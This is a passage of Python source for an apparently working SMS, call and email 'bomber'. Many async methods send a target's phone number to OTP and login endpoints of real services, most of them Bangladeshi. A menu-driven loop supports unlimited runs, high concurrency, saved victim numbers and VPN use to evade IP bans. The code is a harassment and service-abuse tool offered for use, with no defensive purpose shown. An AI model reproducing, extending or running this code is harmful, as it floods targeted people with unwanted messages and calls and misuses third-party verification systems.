    @smart_api
    async def api_api_new_137(self):
        target = self.target
        url = "https://waltonplaza.com.bd/auth/phone-login".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_137 - waltonplaza.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_137 - waltonplaza.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_138(self):
        target = self.target
        url = "https://web.tallykhata.com/api/auth/init".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_138 - web.tallykhata.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_138 - web.tallykhata.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_139(self):
        target = self.target
        url = "https://www.8mbets.net/api/register/verify".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_139 - www.8mbets.net", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_139 - www.8mbets.net", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_140(self):
        target = self.target
        url = "https://www.daktare.com/login/mobile".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_140 - www.daktare.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_140 - www.daktare.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_141(self):
        target = self.target
        url = "https://www.googleapis.com/auth/plus.login".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_141 - www.googleapis.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_141 - www.googleapis.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_142(self):
        target = self.target
        url = "https://www.jayabaji3.com/api/register/confirm".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_142 - www.jayabaji3.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_142 - www.jayabaji3.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_143(self):
        target = self.target
        url = "https://www.khaasfood.com/api/auth/request-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_143 - www.khaasfood.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_143 - www.khaasfood.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_144(self):
        target = self.target
        url = "https://www.sumashtech.com/api/send-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_144 - www.sumashtech.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_144 - www.sumashtech.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_145(self):
        target = self.target
        url = "https://www.wafilife.com/api/auth/send-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_145 - www.wafilife.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_145 - www.wafilife.com", False, "Error", fmt=current_api_fmt.get())
            return False

async def main():
    while True:
        # Self-healing check: Even if someone tries to modify the function code in memory
        # the banner function itself enforces the links.
        clear()
        banner()

        print(f"{Y}[!] For optimal performance and to avoid IP bans, it is highly recommended to use a VPN service.")
        print(f"{Y}[!] Please connect your VPN to a stable location before starting.\n{W}")

        try:
            print(f"{C}[1] SMS Bombing")
            print(f"{C}[2] Call Bombing")
            print(f"{C}[3] Email Bombing")
            print(f"{C}[4] Saved Numbers")
            print(f"{C}[5] Settings & AI Control")
            print(f"{C}[E] Exit Project")
            choice = input(f"\n{Y}[?] Select Mode: {W}").lower()

            if choice == 'e':
                logging.info(f"{G}[✓] Thank you for using SMS Bomber!{W}")
                break

            if choice == '1' or choice == '2':
                mode = 'sms' if choice == '1' else 'call'
                target = input(f"{C}[?] Enter Target Number (e.g. 017xxxxxxxx): {W}")
                if len(target) != 11 or not target.isdigit():
                    logging.error(f"{R}[!] Invalid Number Format!{W}")
                    await asyncio.sleep(2)
                    continue
                # Save number system
                save_choice = input(f"{C}[?] Save this number? (y/n): {W}").lower()
                if save_choice == 'y':
                    name = input(f"{C}[?] Enter Name for this number: {W}")
                    save_number(name, target)
            elif choice == '3':
                mode = 'email'
                target = input(f"{C}[?] Enter Target Email: {W}")
                if "@" not in target:
                    logging.error(f"{R}[!] Invalid Email Format!{W}")
                    await asyncio.sleep(2)
                    continue
            elif choice == '4':
                target = list_saved_numbers()
                if not target:
                    continue
                mode_choice = input(f"{C}[?] Select Mode (1: SMS, 2: Call): {W}")
                mode = 'sms' if mode_choice == '1' else 'call'
            elif choice == '5':
                await settings_menu()
                continue
            else:
                logging.error(f"{R}[!] Invalid Choice!{W}")
                await asyncio.sleep(2)
                continue

            limit_input = input(f"{C}[?] Enter Bombing Limit (0 for Unlimited): {W}")
            limit = int(limit_input) if limit_input.isdigit() else 0

            tasks_count_input = input(f"{C}[?] Enter Concurrency Level (Default: 50): {W}")
            tasks_count = int(tasks_count_input) if tasks_count_input.isdigit() else 50

            logging.info(f"\n{Y}[*] Starting {mode.upper()} Bombing on {target} with {tasks_count} concurrent tasks...{W}")
            logging.info(f"{Y}[*] Press Enter to stop and return to menu.\n{W}")

            stop_event = asyncio.Event()
            async with AsyncBomber(target, limit, mode, stop_event, concurrency=tasks_count) as bomber:
                bombing_tasks = [asyncio.create_task(bomber.bomb_task()) for _ in range(tasks_count)]

                # Task to wait for user input to stop the bombing
                input_task = asyncio.create_task(asyncio.to_thread(input, ""))
                
                # Wait for either all bombing tasks to complete (if limit is set) or user input to stop
                bombing_group = asyncio.gather(*bombing_tasks, return_exceptions=True)
                done, pending = await asyncio.wait([bombing_group, input_task], return_when=asyncio.FIRST_COMPLETED)

                # Signal stop
                bomber.running = False
                stop_event.set()

                # Cancel any remaining pending bombing tasks
                for task in pending:
                    task.cancel()
                await asyncio.gather(*pending, return_exceptions=True)

                # Clean up input task
                if not input_task.done():
                    input_task.cancel()
                try:
                    await input_task
                except asyncio.CancelledError:
                    pass

            logging.info(f"\n\n{G}[✓] Bombing Stopped!{W}")
            logging.info(f"{G}[+] Total Sent: {bomber.sent}{W}")
            logging.info(f"{R}[-] Total Failed: {bomber.failed}{W}")
            logging.info(f"{Y}[*] Detailed log saved to: {bomber.log_file}{W}")
            print(f"\n{C}Press Enter to return to main menu...{W}")
            input()

        except KeyboardInterrupt:
            logging.info(f"\n\n{R}[!] Use 'Enter' to stop bombing. Press 'Enter' again to exit project.{W}")
            try:
                input()
                break
            except:
                break
        except Exception as e:
            logging.error(f"\n{R}[!] Error: {e}{W}")
            await asyncio.sleep(3)
def main_entry():
    """Entry point for the console script."""
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main_entry()
